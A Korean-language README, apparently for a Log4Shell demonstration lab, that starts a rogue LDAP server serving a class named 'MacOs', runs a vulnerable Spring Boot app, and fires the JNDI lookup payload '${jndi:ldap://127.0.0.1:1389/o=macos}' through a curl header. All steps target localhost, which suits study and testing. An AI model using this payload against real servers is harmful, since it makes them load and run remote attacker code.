## log4j-injection
바이너리 파일 릴리스


### Usage
LDAP Server 실행하기
```
$ java -jar ./ldap-server-1.0-SNAPSHOT.jar
LADP Server ldap.Starter
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://127.0.0.1:1389/o=macos to ldap.controllers.MacOs
```
Application Server 실행하기
```
$ java -jar ./app-server-0.0.1-SNAPSHOT.jar
.   ____          _            __ _ _
/\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
\\/  ___)| |_)| | | | | || (_| |  ) ) ) )
'  |____| .__|_| |_|_| |_\__, | / / / /
=========|_|==============|___/=/_/_/_/
:: Spring Boot ::                (v2.6.1)

2021-12-23 10:18:17.091  INFO 26433 --- [           main] c.s.a.AppServerApplication               : Starting AppServerApplication using Java 1.8.0_261 on hwangjeongseob-ui-MacBook-Pro.local with PID 26433 (/Users/seobby/Work/Source/2021/log4j/log4j-injection/release/app-server-0.0.1-SNAPSHOT.jar started by seobby in /Users/seobby/Work/Source/2021/log4j/log4j-injection/release)
2021-12-23 10:18:17.104  INFO 26433 --- [            main] c.s.a.AppServerApplication               : No active profile set, falling back to default profiles: default
2021-12-23 10:18:18.197  INFO 26433 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat initialized with port(s): 8080 (http)
2021-12-23 10:18:18.226  INFO 26433 --- [           main] o.a.c.c.StandardService                  : Starting service [Tomcat]
2021-12-23 10:18:18.226  INFO 26433 --- [           main] o.a.c.c.StandardEngine                   : Starting Servlet engine: [Apache Tomcat/9.0.55]
2021-12-23 10:18:18.310  INFO 26433 --- [           main] o.a.c.c.C.[.[.[/]                        : Initializing Spring embedded WebApplicationContext
2021-12-23 10:18:18.311  INFO 26433 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 1117 ms
2021-12-23 10:18:18.958  INFO 26433 --- [           main] o.s.b.w.e.t.TomcatWebServer              : Tomcat started on port(s): 8080 (http) with context path ''
2021-12-23 10:18:18.973  INFO 26433 --- [           main] c.s.a.AppServerApplication               : Started AppServerApplication in 2.298 seconds (JVM running for 3.227)
2021-12-23 10:18:22.680  INFO 26433 --- [nio-8080-exec-1] o.a.c.c.C.[.[.[/]                        : Initializing Spring DispatcherServlet 'dispatcherServlet'
2021-12-23 10:18:22.680  INFO 26433 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Initializing Servlet 'dispatcherServlet'
2021-12-23 10:18:22.681  INFO 26433 --- [nio-8080-exec-1] o.s.w.s.DispatcherServlet                : Completed initialization in 1 ms
```
테스트하기
```
$ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/o=macos}'
Hello, world!
```